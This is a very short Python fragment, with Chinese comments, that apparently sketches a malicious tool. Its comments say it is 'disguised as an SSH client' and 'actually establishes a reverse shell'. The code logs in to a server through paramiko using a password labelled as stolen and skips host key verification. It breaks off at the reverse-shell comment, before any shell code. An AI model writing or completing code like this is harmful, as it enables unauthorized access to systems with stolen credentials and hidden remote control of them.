import socket
import paramiko

# 伪装成 SSH 客户端
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect("legitimate-server.com", username="user", password="stolen_password")

# 实际上建立反向 shell
